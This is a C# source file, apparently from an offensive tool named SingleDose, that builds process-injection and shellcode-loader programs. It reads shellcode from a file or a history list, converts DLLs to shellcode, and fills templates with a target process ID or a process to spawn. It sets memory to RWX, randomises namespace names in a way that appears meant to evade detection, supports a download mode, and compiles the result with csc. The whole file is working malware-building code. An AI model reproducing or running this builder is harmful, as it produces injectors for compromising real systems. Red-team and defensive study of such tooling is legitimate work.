using SingleDose.Menus;
using SingleDose.Techniques;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace SingleDose.Misc
{
    internal class Build
    {
        public static List<string> CompiledFiles = new List<string>();
        public static byte[] StaticInjectData()
        {
            ShellcodeHistory scHistoryEntry = new ShellcodeHistory();

            bool bvUseHistory = false;
            if (Shellcode.History.Count > 0)
            {
                string UserInput;
                SDConsole.Write("Would you like to select from history? (Y/N)");
                do
                {
                    Console.Write("       > ");
                    SDConsole.iConsoleLineNum++;
                    UserInput = Console.ReadLine();
                } while (!UserInput.StartsWith("y", StringComparison.OrdinalIgnoreCase) && !UserInput.StartsWith("n", StringComparison.OrdinalIgnoreCase));

                if (UserInput.StartsWith("y", StringComparison.OrdinalIgnoreCase))
                {
                    bvUseHistory = true;
                }
            }

            string ShellCodeSelected;
            if (bvUseHistory)
            {
                Shellcode.DisplayHistory();
                SDConsole.Write("Enter selection: ");
                SDConsole.iConsoleLineNum++;
                do
                {
                    Console.Write("       > ");
                    SDConsole.iConsoleLineNum++;
                    ShellCodeSelected = Console.ReadLine();
                } while (ShellCodeSelected.ToLower() != "exit" && !((ShellCodeSelected.Length < 3 && int.Parse(ShellCodeSelected[1].ToString()) <= Shellcode.History.Count)));

                if (ShellCodeSelected.ToLower() == "exit")
                {
                    SDLog.AddEntry("Build aborted");
                    return null;
                }
            }
            else
            {
                SDConsole.Write("Enter path to payload:");
                do
                {
                    Console.Write("       > ");
                    SDConsole.iConsoleLineNum++;
                    ShellCodeSelected = Console.ReadLine();
                } while (!File.Exists(ShellCodeSelected) && ShellCodeSelected.ToLower() != "exit");

                if (ShellCodeSelected.ToLower() == "exit")
                {
                    SDLog.AddEntry("Build aborted");
                    return null;
                }
            }

            byte[] ShellCode = new byte[] { };
            if (ShellCodeSelected.Length < 3)
            {
                int entry = int.Parse(ShellCodeSelected[1].ToString());
                ShellCode = Shellcode.History[entry - 1].Shellcode;
            }
            else if (ShellCodeSelected.EndsWith(".dll"))
            {
                ShellCode = SRDI.Generate(ShellCodeSelected);
                if(ShellCode == null)
                {
                    SDConsole.WriteError("Build aborted");
                }
            }
            else
            {
                ShellCode = File.ReadAllBytes(ShellCodeSelected);
            }

            scHistoryEntry.Path = ShellCodeSelected;
            scHistoryEntry.Shellcode = ShellCode;

            if (ShellCodeSelected.Length > 2)
            {
                Shellcode.History.Add(scHistoryEntry);
            }

            if (Shellcode.History.Count > SettingsMenu.MaxHistoryEntries)
            {
                Shellcode.History.RemoveAt(0);
            }

            SDLog.AddEntry(String.Format("Shellcode selected: {0}", ShellCodeSelected));
            SDLog.AddEntry(String.Format("Shellcode size: {0}", ShellCode.Length));

            return ShellCode;
        }

        public static string AddPrerequisites(ITechnique technique, string szContents)
        {
            Regex rpPattern;
            foreach (string szPrereq in technique.Prerequisites)
            {
                switch(szPrereq)
                {
                    case "ProcessID":
                        rpPattern = new Regex("{{PROCESSID}}");
                        if (SettingsMenu.szInjectMode == "Static")
                        {
                            string szTargetPid = null;
                            SDConsole.Write("Enter Target PID: ");
                            do
                            {
                                Console.Write("       > ");
                                szTargetPid = Console.ReadLine();
                                SDConsole.iConsoleLineNum++;
                            } while (string.IsNullOrEmpty(szTargetPid) && szTargetPid.ToLower() != "exit");

                            if (szTargetPid.ToLower() == "exit")
                            {
                                return null;
                            }

                            szContents = rpPattern.Replace(szContents, szTargetPid);

                        }
                        else if (SettingsMenu.szInjectMode == "Dynamic" || SettingsMenu.szInjectMode == "Download")
                        {
                            szContents = rpPattern.Replace(szContents, "parsedArgs.ProcessId");
                        }
                        break;
                    case "SpawnProcess":
                        rpPattern = new Regex("{{SPAWNPROCESS}}");
                        if (SettingsMenu.szInjectMode == "Static")
                        {
                            string szExePath = null;
                            SDConsole.Write("Enter process to spawn: ");
                            
                            do
                            {
                                Console.Write("       > ");
                                szExePath = Console.ReadLine();
                                SDConsole.iConsoleLineNum++;
                            } while (string.IsNullOrEmpty(szExePath) && szExePath.ToLower() != "exit");

                            if (szExePath.ToLower() == "exit")
                            {
                                return null;
                            }

                            szContents = rpPattern.Replace(szContents, "@\"" + szExePath + "\"");

                        }
                        else if (SettingsMenu.szInjectMode == "Dynamic" || SettingsMenu.szInjectMode == "Download")
                        {
                            szContents = rpPattern.Replace(szContents, "parsedArgs.spawn");
                        }
                        break;
                    default:
                        break;

                }
            }
            
            return szContents;
        }

        public static void BuildBody(ITechnique technique)
        {
            //Get the base template for the technique
            string Contents = technique.Base;

            SDLog.AddEntry(String.Format("Build started: {0}", technique.TechniqueName));

            //Add any triggers
            Contents = AddTriggers(Contents);

            //Add any necessary PInvoke signatures based
            Contents = InvokeHandler.AddInvokes(technique, Contents);

            //Make sure the payload allocation can be modified.
            if (technique.VProtect == null)
            {
                SDConsole.WriteWarning("Memory allocation/protection is not configurable for this technique.");
            }
            else
            {
                //Configure the memory allocation to RWX or RW depending on the memory allocation method
                Contents = MemConfig.SetMem(Contents);

                // If memory allocation is RW/RX, change the code cave's mem protections to RX
                Contents = MemConfig.SetProtect(technique, Contents);
            }

            Regex rpPattern;
            rpPattern = new Regex("{{NAMESPACE}}");
            Contents = rpPattern.Replace(Contents, GenRandomString());

            if (technique.Prerequisites != null)
            {
                Contents = AddPrerequisites(technique, Contents);

                //AddPrerequisites returns null if the user did not answer for all prerequisites.
                if (Contents == null)
                {
                    return;
                }
                SDLog.AddEntry("Prerequisites added to contents");
            }

            switch (SettingsMenu.szInjectMode)
            {
                case "Static":
                    SDLog.AddEntry("Mode: Static");
                    //Get the shellcode data
                    byte[] bShellcode = StaticInjectData();

                    //Make sure it's not an empty array
                    if (bShellcode == null)
                    {
                        return;
                    }

                    //Stringify the shellcode byte array
                    string ByteToString = ShellcodeBytesToString(bShellcode, 1000, GenRandomString());

                    //Start replacing various parts of the template based on user settings.
                    rpPattern = new Regex("{{MODE}}");
                    Contents = rpPattern.Replace(Contents, Common.Static);
                    rpPattern = new Regex("{{SHELLCODE}}");
                    Contents = rpPattern.Replace(Contents, ByteToString);
                    rpPattern = new Regex("{{ARGS}}");
                    Contents = rpPattern.Replace(Contents, "");
                    break;
                case "Dynamic":
                    SDLog.AddEntry("Mode: Dynamic");
                    rpPattern = new Regex("{{MODE}}");
                    if (technique.IsLoader)
                    {
                        Contents = rpPattern.Replace(Contents, Common.LoaderDynamic);
                    }
                    else
                    {
                        if (technique.Prerequisites.Contains("ProcessID") || technique.Prerequisites.Contains("SpawnProcess"))
                        {
                            Contents = rpPattern.Replace(Contents, Common.InjectDynamic);
                        }
                    }

                    rpPattern = new Regex("{{ARGS}}");
                    if (technique.IsLoader)
                    {
                        Contents = rpPattern.Replace(Contents, Common.LoaderDynamicArgs);
                    }
                    else
                    {
                        if (technique.Prerequisites.Contains("ProcessID"))
                        {
                            Contents = rpPattern.Replace(Contents, Common.InjectDynamicPIDArgs);
                        }
                        else if(technique.Prerequisites.Contains("SpawnProcess"))
                        {
                            Contents = rpPattern.Replace(Contents, Common.InjectDynamicSpawnArgs);
                        }
                    }

                    break;
                case "Download":
                    SDLog.AddEntry("Mode: Download");
                    rpPattern = new Regex("{{MODE}}");
                    if (technique.IsLoader)
                    {
                        Contents = rpPattern.Replace(Contents, Common.LoaderDownload);
                    }
                    else
                    {
                        if (technique.Prerequisites.Contains("ProcessID") || technique.Prerequisites.Contains("SpawnProcess"))
                        {
                            Contents = rpPattern.Replace(Contents, Common.InjectDownload);
                        }
                    }

                    rpPattern = new Regex("{{ARGS}}");
                    if (technique.IsLoader)
                    {
                        Contents = rpPattern.Replace(Contents, Common.LoaderDownloadArgs);
                    }
                    else
                    {
                        if (technique.Prerequisites.Contains("ProcessID"))
                        {
                            Contents = rpPattern.Replace(Contents, Common.InjectDownloadPIDArgs);
                        }
                        else if (technique.Prerequisites.Contains("SpawnProcess"))
                        {
                            Contents = rpPattern.Replace(Contents, Common.InjectDownloadSpawnArgs);
                        }
                    }
                    break;
                default:
                    break;
            }

            string CSPath = null;

            //Write the final Contents to a .cs file in the specified output directory
            WriteCS(Contents, technique.TechniqueName, SettingsMenu.OutputDirectory, technique.IsUnsafe, out CSPath);

            if (CSPath == null)
            {
                SDConsole.WriteError(String.Format("Error writing cs file to {0}", SettingsMenu.OutputDirectory));
                return;
            }

            if (!SettingsMenu.CompileBinary)
            {
                return;
            }

            //Attempt to compile the .cs file
            bool bvCompiled = CompileCS(technique.TechniqueName, CSPath, technique.IsUnsafe);

            if (bvCompiled)
            {
                SettingsMenu.SuccessfulBuildCount++;
                SDConsole.RefreshConfigPanel();
            }

            SDLog.AddEntry("Build process complete");
        }

        public static void WriteCS(string szCSContents, string InjTechnique, string OutputDirectory, bool IsUnsafe, out string CSPath)
        {
            string szOutputPath;
            try
            {
                if (!Directory.Exists(OutputDirectory + @"\" + InjTechnique))
                {
                    Directory.CreateDirectory(OutputDirectory + @"\" + InjTechnique);
                }

                if (!Directory.Exists(OutputDirectory + @"\" + InjTechnique + @"\Source"))
                {
                    Directory.CreateDirectory(OutputDirectory + @"\" + InjTechnique + @"\Source");

                }
                szOutputPath = OutputDirectory + @"\" + InjTechnique + @"\Source\" + Path.GetRandomFileName().Split('.')[0] + ".cs"; //File extension is randomly generated, but we just want the base filename.;
                File.WriteAllText(szOutputPath, szCSContents);
                if (File.Exists(szOutputPath))
                {
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write("   [*] Wrote: ");
                    Console.ResetColor();
                    Console.WriteLine(Path.GetFileName(szOutputPath));
                    SDConsole.iConsoleLineNum++;
                    CSPath = Path.GetFullPath(szOutputPath);
                    return;
                }
                else
                {
                    SDConsole.WriteError("Error file not found. Exiting build...");
                    CSPath = null;
                    return;
                }

            }
            catch (Exception)
            {
                SDConsole.WriteError("Unable to create .cs, please build again.");
                CSPath = null;
                return;
            }
        }

        public static bool CompileCS(string TechniqueName, string CSFile, bool IsUnsafe)
        {
            string szCSDirectory = Path.GetDirectoryName(CSFile);
            string szOutputDirectory = Path.GetDirectoryName(szCSDirectory);
            string szFile = Path.GetFileName(CSFile);

            if (File.Exists(SettingsMenu.SelectedCompilerPath))
            {
                try
                {
                    string binPath = szOutputDirectory + @"\" + szFile.Split('.')[0] + ".exe";
                    var p = new System.Diagnostics.Process();
                    p.StartInfo.FileName = SettingsMenu.SelectedCompilerPath;
                    if (!IsUnsafe)
                    {
                        p.StartInfo.Arguments = string.Format(" -out:{0} {1}", binPath, CSFile);
                    }
                    else if (IsUnsafe)
                    {
                        p.StartInfo.Arguments = string.Format(" -unsafe -out:{0} {1}", binPath, CSFile);
                    }
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    p.StandardOutput.ReadToEnd();

                    if (File.Exists(binPath))
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.Write("   [+] Compiled: ");
                        Console.ResetColor();
                        Console.WriteLine(TechniqueName + @"\" + Path.GetFileName(binPath));
                        SDConsole.iConsoleLineNum++;
                        CompiledFiles.Add(TechniqueName + @"\" + Path.GetFileName(binPath));
                        if (CompiledFiles.Count > 5)
                        {
                            CompiledFiles.RemoveAt(0);
                        }
                        SDLog.AddEntry(String.Format("Compiled: {0}", binPath));
                        return true;
                    }
                    else
                    {
                        SDConsole.WriteError(String.Format("Compile Error: {0}", TechniqueName + @"\" + Path.GetFileName(binPath)));
                        return false;
                    }
                }
                catch (Exception)
                {
                    return false;
                }
            }
            else
            {
                SDConsole.WriteError(String.Format("Compile Error: {0} not found.", SettingsMenu.SelectedCompilerPath));
                return false;
            }
        }

        public static string ShellcodeBytesToString(byte[] buffer, int blockSize, string variableName)
        {
            List<string> Completed = new List<string>();
            byte[][] blocks = new byte[(buffer.Length + blockSize - 1) / blockSize][];

            for (int i = 0, j = 0; i < blocks.Length; i++, j += blockSize)
            {
                blocks[i] = new byte[Math.Min(blockSize, buffer.Length - j)];
                Array.Copy(buffer, j, blocks[i], 0, blocks[i].Length);
            }

            string result = "";
            Completed.Add("byte[] " + variableName + " = new byte[1000];");
            foreach (byte[] block in blocks)
            {
                result += variableName + " = new byte[]{ 0x" + BitConverter.ToString(block).Replace("-", ", 0x") + "};\n            foreach(byte b in " + variableName + "){payloadList.Add(b);}";
                Completed.Add(result);
                result = "";
            }
            return String.Join("\n            ", Completed.ToArray());
        }
        
        private static string AddTriggers(string CSContents)
        {
            Regex TriggerPattern = new Regex("{{TRIGGER}}");

            if (TriggersMenu.TriggerBody != null)
            {
                CSContents = TriggerPattern.Replace(CSContents, TriggersMenu.TriggerBody);
                SDLog.AddEntry(String.Format("Trigger added: {0}", TriggersMenu.SelectedTrigger.TriggerName));
            }
            else
            {
                CSContents = TriggerPattern.Replace(CSContents, ""); ;
            }

            return CSContents;
        }

        public static string GenRandomString()
        {
            Random random = new Random(Guid.NewGuid().GetHashCode());
            int length = random.Next(3, 9);
            var rString = "";
            for (var i = 0; i < length; i++)
            {
                rString += ((char)(random.Next(1, 26) + 64)).ToString().ToLower();
            }
            return rString;
        }
    }
}
